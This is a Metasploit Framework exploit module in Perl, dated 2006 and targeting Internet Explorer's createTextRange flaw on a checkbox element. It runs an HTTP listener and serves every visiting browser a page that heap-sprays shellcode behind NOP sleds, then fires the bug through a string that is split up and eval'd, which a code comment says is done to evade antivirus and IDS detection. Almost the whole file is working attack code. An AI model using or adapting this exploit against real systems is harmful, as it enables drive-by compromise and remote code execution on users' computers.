##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::ie_checkbox;

use strict;
use base "Msf::Exploit";
use Pex::Text;
use IO::Socket::INET;
use  POSIX;

my $advanced =
  {
  };

my $info =
  {
	'Name'           => 'Internet Explorer checkbox',
	'Version'        => '$Revision: 1.0 $', 
	'Authors'        =>
	  [
                '<justfriends4n0w [at] yahoo.com>'
	  ],

	'Description'    =>
	  Pex::Text::Freeform(qq{
			This module exploits a vulnerability in Internet Explorer's setTextRange on a checkbox
			  

}),

	'Arch'           => [ 'x86' ],
	'OS'             => [ 'win32', 'winxp', 'win2003' ],
	'Priv'           => 0,

	'UserOpts'       =>
	  {
		'HTTPPORT' => [ 1, 'PORT', 'The local HTTP listener port', 8080      ],
		'HTTPHOST' => [ 0, 'HOST', 'The local HTTP listener host', "0.0.0.0" ],
	  },

	'Payload'        =>
	  {
		'Space'    => 1000,
		'MaxNops'  => 0,
		'Keys'     => [ '-ws2ord', '-bind' ],
#		'Keys'     => [ '-ws2ord' ],
	  },

	'Refs'           =>
	  [
		[ 'CVE', '' ],

	  ],

	'DefaultTarget'  => 0,
	'Targets'        =>
	  [
		[ 'Automatic - Windows 2000, Windows XP' ]
	  ],
	
	'Keys'           => [ 'ie', 'internal' ],

	'DisclosureDate' => '22 Mar 2006',
  };

sub new
{
	my $class = shift;
	my $self;

	$self = $class->SUPER::new(
		{
			'Info'     => $info,
			'Advanced' => $advanced,
		},
		@_);

	return $self;
}
sub JSUnescape #Taken from Mozilla_Compareto by Aviv Raff and H D Moore
{
	my $self = shift;
	my $data = shift;
	my $code = '';
	
	# Encode the shellcode via %u sequences for JS's unescape() function
	my $idx = 0;
	while ($idx < length($data) - 1) {
		my $c1 = ord(substr($data, $idx, 1));
		my $c2 = ord(substr($data, $idx+1, 1));	
		$code .= sprintf('%%u%.2x%.2x', $c2, $c1);	
		$idx += 2;
}
	
	return $code;
}


sub Exploit
{
	my $self = shift;
	my $server = IO::Socket::INET->new(
		LocalHost => $self->GetVar('HTTPHOST'),
		LocalPort => $self->GetVar('HTTPPORT'),
		ReuseAddr => 1,
		Listen    => 1,
		Proto     => 'tcp');
	my $client;

	# Did the listener create fail?
	if (not defined($server))
	{
		$self->PrintLine("[-] Failed to create local HTTP listener on " . $self->GetVar('HTTPPORT'));
		return;
	}

	$self->PrintLine("[*] Waiting for connections to http://" . $self->GetVar('HTTPHOST') . ":" . $self->GetVar('HTTPPORT') . " ...");

	while (defined($client = $server->accept()))
	{
		$self->HandleHttpClient(fd => Msf::Socket::Tcp->new_from_socket($client));
	}

	return;
}

sub HandleHttpClient
{
	my $self = shift;
	my ($fd) = @{{@_}}{qw/fd/};
	
	#my $targetIdx = $self->GetVar('TARGET');
	#my $target    = $self->Targets->[$targetIdx];
	#my $ret       = $target->[1];
	
	my $shellcode = $self->GetVar('EncodedPayload')->Payload;
	$shellcode   = $self->JSUnescape($shellcode);
	
 
  	my $content;
	my $rhost;
	my $rport;
 
	my $targets =
	  {
		
		"Windows XP"   => [0 ], 
		
	  };
	my $target;
	my $os;

	# Read the HTTP command
	my ($cmd, $url, $proto) = split / /, $fd->RecvLine(10);

	# Read in the HTTP headers
	while (my $line = $fd->RecvLine(10))
	{
		my ($var, $val) = split /: /, $line;

		# Break out if we reach the end of the headers
		last if (not defined($var) or not defined($val));

		if ($var eq 'User-Agent')
		{	
	$self->PrintLine( " *****useragent:" . $val  );

			$os = "Windows 2003" if (!$os and $val =~ /Windows NT 5.2/);
			$os = "Windows XP"   if (!$os and $val =~ /Windows NT 5.1/);
			$os = "Windows 2000" if (!$os and $val =~ /Windows NT 5.0/);
			$os = "Windows NT"   if (!$os and $val =~ /Windows NT/);
			$os = "Unknown"      if (!$os);
		}
	}

	# Set the remote host information
	($rport, $rhost) = ($fd->PeerPort, $fd->PeerAddr);

	

 

my $content="<input type=\"checkbox\" id=\"blah\">\n <SCRIPT language=\"javascript\">\n" .
"shellcode = unescape(\"$shellcode\");\n" .
"bigblock = unescape(\"%u9090%u9090\");\n" .
"slackspace = 20 + shellcode.length;\n" .
"while (bigblock.length < slackspace)\n" .
"bigblock += bigblock;\n" .
 "fillblock = bigblock.substring(0, slackspace);\n" .
"block = bigblock.substring(0, bigblock.length-slackspace);\n" .
"while(block.length + slackspace < 0x40000) " . 
"block = block + block + fillblock;\n" .
"memory = new Array();\n" .
"for ( i = 0; i < 2020; i++ ) " . 
"memory[i] = block + shellcode;\n";

#Break up the string to avoid Antivirus/IDS
$content=$content .  
" s= \"document.getEle\";\n" .
"s=s + \"mentById\"; \n" .
"s=s + \"(\'blah\')\"; \n " .
"s=s + \".create\";\n" .
"s=s + \"TextRange();\";\n" .
"eval(s);\n" .
"</script>";

 
	$self->PrintLine("[*] HTTP Client connected from $rhost:$rport using $os, sending payload...");

	# Transmit the HTTP response
	$fd->Send(
		"HTTP/1.1 200 OK\r\n" .
		  "Content-Type: text/html\r\n" .
		  "Content-Length: " . length($content) . "\r\n" .
		  "Connection: close\r\n" .
		  "\r\n" .
		  "$content"
	  );

	$fd->Close();
}

1;

